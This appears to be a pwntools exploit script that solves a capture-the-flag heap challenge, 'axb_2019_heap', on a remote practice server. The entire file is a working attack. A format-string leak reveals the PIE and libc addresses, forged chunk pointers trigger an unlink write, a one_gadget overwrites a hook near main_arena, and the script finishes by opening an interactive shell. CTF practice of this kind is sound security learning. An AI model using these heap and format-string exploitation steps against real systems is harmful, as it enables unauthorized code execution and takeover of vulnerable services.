#!/usr/bin/env python
# coding=utf-8
from pwn import *
from LibcSearcher import *
sh=process('./axb_2019_heap')
sh=remote('node3.buuoj.cn', 29374)
elf=ELF('./axb_2019_heap')
libc=ELF('./libc-2.23.so')
#context.log_level='debug'
def Add(index, size, content):
    sh.recvuntil('>> ')
    sh.sendline('1')
    sh.recvuntil(':')
    sh.sendline(str(index))
    sh.recvuntil('Enter a size:\n')
    sh.sendline(str(size))
    sh.recvuntil('Enter the content: \n')
    sh.sendline(content)

def Delete(index):
    sh.recvuntil('>> ')
    sh.sendline('2')
    sh.recvuntil(':\n')
    sh.sendline(str(index))

def Edit(index, content):
    sh.recvuntil('>> ')
    sh.sendline('4')
    sh.recvuntil(':')
    sh.sendline(str(index))
    sh.recvuntil(': ')
    sh.sendline(content)

sh.recvuntil('name: ')
sh.sendline('%19$p%15$p')
sh.recvuntil('Hello, ')
main_current_addr=int(sh.recvuntil('16a'), 16)
start_main_240=int(sh.recv(14), 16)
print hex(main_current_addr)
print hex(start_main_240)
pie_base=main_current_addr-0x116a
start_main=start_main_240-240
libc_base=-libc.sym['__libc_start_main']+start_main
log.success('pie base: '+hex(pie_base))
log.success('libc base: '+hex(libc_base))
main_arena_offest=0x3c4b20
main_arena_addr=libc_base+main_arena_offest
one_gadget=[0x45216, 0x4526a, 0xf02a4, 0xf1147]

Add(0, 0xf8, 'a'*0xf0)
Add(1, 0xf8, 'b'*0xf0)
Add(2, 0xf8, 'c'*0xf0)
note_addr=0x202060+pie_base
Edit(0, p64(0)*2+p64(note_addr-0x18)+p64(note_addr-0x10)+'a'*(0xf8-0x28)+p64(0xf0)+p8(0))
Delete(1)
Edit(0, 'w'*0x18+p64(main_arena_addr-0x1b)+p64(0xf8))
Edit(0, 'w'*0xb+p64(one_gadget[3]+libc_base))
sh.recvuntil('>> ')
sh.sendline('1')
sh.recvuntil(':')
sh.sendline('4')
sh.recvuntil(':\n')
sh.sendline('300')
sh.interactive()


